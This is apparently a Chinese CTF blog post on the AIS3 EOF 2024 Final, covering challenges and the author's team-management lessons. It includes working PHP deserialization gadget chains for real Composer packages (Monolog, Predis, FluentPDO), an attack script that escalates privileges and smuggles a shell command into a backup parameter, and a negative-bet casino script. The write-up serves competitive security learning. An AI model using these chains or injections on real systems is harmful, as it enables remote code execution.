---
title: AIS3 EOF 2024 Final
date: 2024-02-05 21:27:31
tags: 
  - AIS3
  - CTF
categories:
  - [AIS3, EOF]
typora-root-url: .
excerpt: 本文將包含我有看的題目、賽前準備以及團隊分工的心得, 由於大部分隊友都不認識, 而且一隊有 8 人, 在這種情況下團隊分工會是很大的挑戰, 也在這次體驗到各種很壞的團隊分工, 光是團隊分工就可以讓我們排名在第一天就掉到倒數第二, 我在當晚匯集隊友重新調整, 在第二天第 140 回合就衝到了前三.
cover: /ais3-eof-2024-final/TakeKitsune.webp
photos:
  - /ais3-eof-2024-final/TakeKitsune.webp
---



本文將包含我有看的題目、賽前準備以及團隊分工的心得, 由於大部分隊友都不認識, 而且一隊有 8 人, 在這種情況下團隊分工會是很大的挑戰, 也在這次體驗到各種很壞的團隊分工, 光是團隊分工就可以讓我們排名在第一天就掉到倒數第二, 我在當晚匯集隊友重新調整, 在第二天第 140 回合就衝到了前三. 這經驗對於我未來的團隊管理會有很大的幫助.

另外這次共有 5 題, 其中 4 題最需要的都是 web, 只有一題是 pwn, 然後我這隊只有我 & ywc 是打 web 的..

## popper [KoH]

Author: splitline

### 題目

```markdown
TL;DR: 找到網路上隨便一個 composer package 裡的反序列化 RCE gadget，越好用+越短越好。

你可以安裝任意一個存在的 composer package，目標是找到一個能執行任意 function 的反序列化 gadget

你需要使用 p0pp3r_win function 來執行 ./@ --give-me-flag 指令

只有 p0pp3r_win 是有效的目標，其他任何的 function 都不會被計分系統接受，就算其能成功達成 RCE

你的 payload 中必須至少使用到一個直接屬於 package 的 namespace 裡的 class（根據 psr-0、psr-4 判斷）

對於每一個 package，只會存在一個最佳 gadget 能獲得分數，比較順位如下：

Gadget 依賴條件：毋需條件 > __toString > __call

Payload 長度：短的可以取代長的

Package 星星數越多，其價值分數越高

分數計算以執行完成的時刻為準，而非提交時間；若一個 payload 尚未執行完畢，無法嘗試第二個

一律安裝「2024/2/3 10:00 UTC+8 前」釋出的最新一個版本

執行環境為 docker 映像 php:cli，原始碼大致上如下：

<?php
require 'vendor/autoload.php';
function p0pp3r_win($command) {
  system($command);
}
unserialize(PAYLOAD);
```

### 比賽情況

看到這種題目一定就會想拿 PHPGGC 直接炸下去🍤, 所以題目作者就在 -1 回合的時候就用 NPC 隊把他生的 payload 全部都用上去, 請 AxelHowe (打 pwn 的) 跟 Ching367436 幫忙試才發現的, 接著 Ching367436 看到 PHPGGC 有 [pr](https://github.com/ambionics/phpggc/pull/160), 裡面有其他原本沒有的, 發現全部都不行, 後來有隊伍拿 edu-ctf 的 chain 來打 (predis), 就待在排名上面一直拿分, 第一天那題就沒有動靜了

第二天清晨, 我在 https://packagist.org/explore/popular 逛了各種熱門的 composer 的 app. 基本上流程就是把 package 載下來, 找 php magic method, 找不到就刪掉換下一個, 發現其實 `__destruct` 還蠻稀有的, 後來翻到 https://packagist.org/explore/popular?query=FluentPDO , 然後 splitline 那邊有[現成的 chain](https://github.com/splitline/My-CTF-Challenges/tree/master/tsj-ctf/avatar) 可用, 拿來改成可以用的形狀後, 我把一個 chain 當 3 個來用, 因為 `envms/fluentpdo` `lichtner/fluentpdo` `fpdo/fluentpdo` 都是同個東西, 所以就用這個拿 3 倍的分數, 靠這個就在這題第一名待了幾個小時, 後來被抄走了 ==.

#### 各種縮短 POP Chain 的手法

第一種就是直接找其他更短的 chain, 但時間成本較高. 我在 `fluentpdo` 被搶走後採用的是: 在生 chain 的過程把所有 `private` `protected` 的部分改成 `public`, 這樣可以少一些 `\x00`  如下:

![](/ais3-eof-2024-final/poper-public.webp)

```python
# before
b'O:30:"Envms\\FluentPDO\\Queries\\Select":3:{s:9:"\x00*\x00fluent";O:21:"Envms\\FluentPDO\\Query":1:{s:32:"\x00Envms\\FluentPDO\\Query\x00structure";O:25:"Envms\\FluentPDO\\Structure":1:{s:37:"\x00Envms\\FluentPDO\\Structure\x00primaryKey";s:10:"p0pp3r_win";}}s:8:"\x00*\x00regex";O:21:"Envms\\FluentPDO\\Regex":0:{}s:13:"\x00*\x00statements";a:2:{s:8:"GROUP BY";a:1:{i:0;s:2:"a:";}s:4:"FROM";s:18:"./@ --give-me-flag";}}'
# after
b'O:30:"Envms\\FluentPDO\\Queries\\Select":3:{s:9:"\x00*\x00fluent";O:21:"Envms\\FluentPDO\\Query":1:{s:9:"structure";O:25:"Envms\\FluentPDO\\Structure":1:{s:10:"primaryKey";s:10:"p0pp3r_win";}}s:8:"\x00*\x00regex";O:21:"Envms\\FluentPDO\\Regex":0:{}s:13:"\x00*\x00statements";a:2:{s:8:"GROUP BY";a:1:{i:0;s:2:"a:";}s:4:"FROM";s:18:"./@ --give-me-flag";}}'
# after after
'O:30:"Envms\\FluentPDO\\Queries\\Select":3:{s:6:"fluent";O:21:"Envms\\FluentPDO\\Query":1:{s:9:"structure";O:25:"Envms\\FluentPDO\\Structure":1:{s:10:"primaryKey";s:10:"p0pp3r_win";}}s:5:"regex";O:21:"Envms\\FluentPDO\\Regex":0:{}s:10:"statements";a:2:{s:8:"GROUP BY";a:1:{i:0;s:2:"a:";}s:4:"FROM";s:18:"./@ --give-me-flag";}}'
```

所以把這個搶回來了, 然後又被搶走了, 因為我 `\x00` 沒全部處理掉. 但我把其他人的搶走 (對方 payload 後面多了 `\n`, 刪掉後就得手), 所以我們還是第一, 這題變成比手速的題目了.

到了下午, 有更多奇怪的手段出現, 像是讓 chain 裡面的字串更短.

```python
b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:19:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:5:"mixed";s:18:"./@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'
b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:18:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:4:"info";s:18:"./@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'
b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:18:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:4:"info";s:16:"@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'
b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:18:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:0:"";s:18:"./@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'

b'O:34:"Predis\\Connection\\StreamConnection":1:{s:13:"\x00*\x00parameters";O:28:"Predis\\Configuration\\Options":3:{s:10:"\x00*\x00options";a:0:{}s:8:"\x00*\x00input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:53:"\x00Predis\\Cluster\\Distributor\\HashRing\x00nodeHashCallback";s:10:"p0pp3r_win";s:42:"\x00Predis\\Cluster\\Distributor\\HashRing\x00nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:11:"\x00*\x00handlers";a:1:{s:10:"persistent";s:37:"\\Predis\\Configuration\\Option\\Commands";}}}'
b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:37:"\\Predis\\Configuration\\Option\\Commands";}}}'
b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:29:"\\Predis\\Configuration\\Options";}}}'
b'O:34:"Predis\\Connection\\StreamConnection"::{s:10:"parameters";O:28:"Predis\\Configuration\\Options"::{s:7:"options";a::{}s:5:"input";a::{s:10:"persistent";a::{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing"::{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a::{i:0;a::{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a::{s:10:"persistent";s:37:"\\Predis\\Configuration\\Option\\Commands";}}}'
b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":2:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:0:{}}}'
```

但最特別的還是這個

```python
b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:36:"Predis\\Configuration\\Option\\Commands";}}}'
b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:36:"Predis\\Configuration\\Option\\Commands";}'
```

這兩個 chain 唯一的差別就是刪掉了最後面的 `}`, 是 starburst 隊發現的, 我在短短的 5 秒內分析出了這個手段, 然後把更多尾端的 `}` 刪掉送出, 就成功搶走他們的了, 這前後可能才十秒的時間, 所以這個真的是比手速.

這題是我跟其他隊交流最多的一題 (有打這題的隊伍比例只有 50%), 能感受到正在跟真人互動, 賽後也跟對上的人聊的很開心.

補個 splitline 在賽中說其實也可用的 chain 的 [write-up](https://hackmd.io/@Ching367436/r1w_xLFdo#%E4%BB%BB%E6%84%8F-require--phpinfo-to-RCE), 是去年 edu-ctf 的但沒有官方解答.

## Pwn2Own

題目是一個 樹莓派, 上面有 firmware, 是個計分板的 app.

![pwn2own](/ais3-eof-2024-final/pwn2own.webp)



每組都有一個 pie, 主辦方會將 firmware 放到 google drive 供大家下載, 要自己拆開.

```sh
binwalk -Mre firmware
```

拆開後大概長這樣: 

![](/ais3-eof-2024-final/pwn2own-firmware.webp)

所以這主要是 web 而不是 pwn.

參賽者的目標是要讓 pie 顯示出指定影片, 可以透過 XSS 或 RCE 來達成. 

payload 要透過交給主辦方的 write-up, 由主辦方在 pie 的同個網路環境執行, 只能透過網路進行攻擊, 不能在 pie 接上 usb.

有人打成功後主辦會上 patch, 所以會越來越難, 也有少數 pwn 的洞, 像是這個

![](/ais3-eof-2024-final/pwn2own-auth.webp)

這個 bin 是保護全關的, 唯一的缺點是他是 arm-32.

```sh
root@c603fff492a6 /home# checksec auth
[*] '/home/auth'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x10000)
    Stack:    Executable
    RWX:      Has RWX segments
```

後面隊友用 Apple ARM 的 Mac Docker 開了對應架構的 VM, 可以跑但不能 gdb, 聽說用 x86 開就可用. 到了隔天, 我幫隊友從我們的 pie 打 shell 出來給用 gdb, 但還是沒找到 stack 的 address... 後來有別隊解出這個洞.

有另個洞是把 firmware flash 成舊版本, 然後用舊版的洞來打, 後來有 patch 成需要過 auth 才能, 但還是能打過 auth (fixed secret), 但後來時間不夠, 不然基本上 exp 已經寫好了.

感覺我一開始就跳進這題分數會多很多.

這題推別隊寫的[這篇](https://hackmd.io/@TWNWAKing/HJK40Xpca) write-up.

## hahamut [A&D]

這題我基本上只有參與輔助的部分, 題目我沒看. 主要就是自動抓流量來到 Arkime 上看, attack manager 部分由 Wilson 負責, ywc 負責拆 patch. 沒想到過了整個上午我們這隊有洞可以打, 但沒人攻擊 QQ. 直到我午後臨時進入, 從封包抄走別隊的攻擊才開始有攻擊分, 我們隊基本上只有被打穿兩種洞.

附個攻擊 script.

```python
#!/usr/bin/env python3
import sys
from secrets import token_hex
import requests

def main():
    url = f"http://{sys.argv[1]}:8763"
    sess = requests.Session()

    username = token_hex(16)
    sess.post(url + '/register', data={
        'username': username,
        'password': username,
        'role': 'user'
    })

    sess.post(url + '/update', data={
        'user[role]': 'admin',
    })

    # 'backup[users]=1&backup[-Iecho+`cat+/flag`>/app/public/af9acdd862352d3d895f16f0dd3380724b0dd33214f1fe8253b6072aaa0b9333e776a1a90555274789a2953c152fafc9]=test'
    sess.post(url + '/admin/backup', data={
        "backup[users]": "1",
        f"backup[-Iecho `cat /flag`>/app/public/{username}]": "test"
    })
    r = sess.get(url + f'/{username}.json')
    print(r.text, flush=True)

main()
```

另外比賽給的 patch 是從 Docker 出來的, 所以拆的時候要像這樣:

```sh
rm file*
wget --header="Authorization: <team token>" http://35.221.224.244:8888/patch/123/file
zstd -d file -o file.tar
undocker file.tar team3_r89.tar
mkdir team3_r89
tar xvf team3_r89.tar -C team3_r89
diff -r src patches/team3_r89/app/src/
```

基本上跟 DEF CON 一樣.

賽後 maple3142 說這題可以 persist 一直拿 flag, 因為不會被洗掉, 但沒人做.

## Casino [A&D / KoH?]

這題只有幫忙臨時寫 script, 寫的是到別人的賭場賭負數的錢, 大概花了 1~2 分鐘寫好.

```python
import os

def get_user_token():
    import requests
    URL = 'http://10.102.100.2:8080/api/roundInfo?team_token=467f2d77f9df424490d15fc05d80774a'
    response = requests.get(URL).json()
    return response['user_token']

def main():
    import requests
    while True:
        for i in range(1, 11):
            user_token = get_user_token()
            if i == 6: continue
            print(i)
            cmd = '''
    curl 'http://10.102.'''+str(i)+'''.20:8000/api/start_game' \
    -H 'Accept: */*' \
    -H 'Accept-Language: zh-TW,zh;q=0.9' \
    -H 'Connection: keep-alive' \
    -H 'Content-Type: application/json' \
    -H 'Cookie: SL_G_WPT_TO=zh-TW; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1; teamToken=<team token>' \
    -H 'DNT: 1' \
    -H 'Origin: http://10.102.9.20:8000' \
    -H 'Referer: http://10.102.9.20:8000/' \
    -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0' \
    --data-raw '{"user_token":"'''+user_token+'''","bet":"-10000"}' \
    --compressed \
    --insecure  '''
    
            print(cmd)        

            os.system(cmd)
main()
```

## ICPC [KoH]

給了競程的題目, 要用 shellcode 解, 像是算 a+b 等於多少、sort 之類的, 可以禁止某些 byte, 基本上這題我沒參與, 這是唯一適合我這隊幾乎全 pwn 組成的題目, 第二天打的很不錯.

## 賽前準備

這次決賽採主辦方讓每個人依出賽排名輪流選隊的方式, 我隊內大概有兩個是認識的, 共有八人, 人數偏多, 大部分都不認識, 所以在團隊運作上有很大的挑戰. 賽前我把隊友聚集起來, 線上討論準備了 attack manager 跟 pcap search 還有各種語言的混淆工具, 也了解了隊友擅長的領域, 大部分隊友都是打 pwn, reverse 跟 crypto 的, 能打 web 的就我跟 ywc 而已. 以這次 EOF 賽後來看, 多一點 web 的人會有利很多. 比賽環境包含 scoreboard 都要透過 jumpbox 連上, 所以請 ywc 在上面用個 VPN server.

## 團隊分工 -- 這次收穫最多的地方

第一天已開始放出了 1 題 A&D, 1 題 KoH 及 1 題 pwn2own, 實際上全部都是 web 題. 我一開始是直接讓每一題都有人看, 請 Wilson 把 attack manager 送 flag 得部分處理好, 接著我把自動下載封包 + import 寫好. 

在這個時候我都還以為 Pwn2Own 打的是 pwn, 所以就把這題一直放在主 pwn 的隊友那邊, 等發現的時候第一天也快結束了, 這是這次分數虧最大的地方, 所以定期了解各題概況會是相當重要的一步.

另一個方面在第一天其他部分的人力配置也很不好, 最 critical 的是我這隊打 web 的真的太少, 所以四題 web 可能只能選一題請 Ching367436 輸出. 在第一天經歷過這些也讓我們排名掉到了倒數第二 (倒數第一是 NPC). 所以第一天晚上我把隊友都聚集在一起, 重新調整隊伍配置.

### 調整隊伍配置及戰略

因為都來到了倒數第二, 勢必有東西是需要捨去的. 我給了隊友們兩個選項:

1. 衝高分數
2. 拿到獎狀就好

選 2 表示要將全隊集中在同一題, 來拿那題的獎狀, 1 則是讓 overall 的分數最高. 最後我們選擇走 1.

我決定第一個捨去掉的是 hahamut 這題的人力, 只留半個人顧封包, 事後證實這很正確, 因為沒人打穿. 接著由 Ching367436 一個人負責 popper 這題, 這也為我們賺了很多分, 這題在第二天我們大部分回合都是第一的 king. ICPC 這題則是放剛好夠的人力進去, 其他大部分都放進新的題目.也放了一些人打 Pwn2Own 的 pwn 部分. 第二天午後 casino 這題戰況也陷入膠著, 我請 Wilson 把這題我們放上讓其他隊都無法攻擊的 patch (拉下整個服務, 讓其他隊無法攻擊) 後把人力空出來去打 Pwn2Own.

經過調整之後, 我們隊在第二天 140 回合附近進入了前三, 可見調整人力配置 (尤其是互相不認識的多人隊伍) 對分數由很大的影響.
